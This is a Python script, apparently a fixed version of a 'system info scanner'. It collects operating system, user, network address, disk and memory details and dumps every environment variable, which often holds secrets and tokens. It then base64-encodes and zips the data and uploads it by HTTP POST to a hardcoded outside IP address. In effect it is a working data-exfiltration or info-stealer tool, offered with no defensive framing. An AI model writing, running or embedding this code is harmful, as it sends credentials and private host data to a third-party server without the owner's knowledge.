# sysinfo_scanner_fixed.py

from __future__ import annotations

import sys
import subprocess
from pathlib import Path
import platform
import socket
import os
import uuid as _uuid     # import with internal alias to avoid accidental shadowing
import getpass
import base64
import zipfile
import tempfile
import json
import requests
from dotenv import load_dotenv
import traceback
import psutil

# load .env for sensitive tokens

load_dotenv()

class SysInfoScanner:

    def __init__(self, save_location: Path):

        self.save_location = save_location



    def os_info(self):

        return {

            "OS": platform.system(),

            "OS Version": platform.version(),

            "Release": platform.release()

        }



    def mach_proc_info(self):

        return {

            "Machine": platform.machine(),

            "Processor": platform.processor(),

            "Architecture": platform.architecture(),

        }



    def user_info(self):

        try:

            user = getpass.getuser()

        except Exception:

            user = None

        return {"User": user}



    def network_info(self):

        # IP resolution is brittle; try multiple ways

        ip = None

        try:

            # First try: resolve hostname

            ip = socket.gethostbyname(socket.gethostname())

            # if this returns loopback, try to open UDP socket to discover outbound IP

            if ip.startswith("127."):

                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

                try:

                    # use a dummy connect to a public IP to get local interface IP

                    s.connect(("8.8.8.8", 80))

                    ip = s.getsockname()[0]

                finally:

                    s.close()

        except Exception:

            ip = None



        # MAC - use uuid.getnode() then format into hex pairs

        try:

            node = _uuid.getnode()

            # if getnode returns a random 48-bit number it's still OK; format as usual

            mac = ':'.join(f"{(node >> (i * 8)) & 0xff:02x}" for i in reversed(range(6)))

        except Exception:

            mac = None



        return {

            "IP Address": ip,

            "MAC Address": mac

        }



    def disk_info(self):

        partitions = []

        try:

            if psutil:

                disk_info = psutil.disk_partitions()

                partitions = [{"device": d.device, "mountpoint": d.mountpoint, "fstype": d.fstype}

                              for d in disk_info]

        except Exception:

            partitions = []

        return {"Disk Partitions": partitions}



    def mem_info(self):

        try:

            if psutil:

                virtual_mem = psutil.virtual_memory()

                return {"Total Memory": virtual_mem.total, "Available Memory": virtual_mem.available}

        except Exception:

            pass

        return {"Total Memory": None, "Available Memory": None}



    def env_info(self):

        try:

            return {"Environment Variables": dict(os.environ)}

        except Exception:

            return {"Environment Variables": {}}



    def _encode(self, info: dict):

        info_str = json.dumps(info)

        encoded_bytes = base64.b64encode(info_str.encode('utf-8'))

        return encoded_bytes.decode('utf-8')



    def _compress(self, encoded_info, filename):

        save_path = self.save_location / filename

        try:

            with zipfile.ZipFile(save_path, 'w', zipfile.ZIP_DEFLATED) as zipf:

                zipf.writestr("systeminfo.txt", encoded_info)

        except Exception:

            raise

        return save_path



    def collect_and_send(self, upload_url: str):

        try:

            system_info = {}

            system_info.update(self.os_info())

            system_info.update(self.mach_proc_info())

            system_info.update(self.user_info())

            system_info.update(self.network_info())

            system_info.update(self.disk_info())

            system_info.update(self.mem_info())

            system_info.update(self.env_info())



            encoded = self._encode(system_info)

            zip_path = self._compress(encoded, "info.zip")



            with open(zip_path, 'rb') as fh:

                files = {'file': fh}

                print(f"[+] Sending data to {upload_url}")

                r = requests.post(upload_url, files=files, timeout=20)

                print("[+] Response:", r.status_code, r.text)

        except Exception as e:

            print("[-] Failed to send:", e)

            traceback.print_exc()

if __name__ == "__main__":

    temp_dir = Path(tempfile.gettempdir())

    scanner = SysInfoScanner(temp_dir)

    # ensure the endpoint matches your server (note earlier your server uses /upload)

    remote_upload_url = f"http://20.93.23.234:8081/upload"

    scanner.collect_and_send(remote_upload_url)

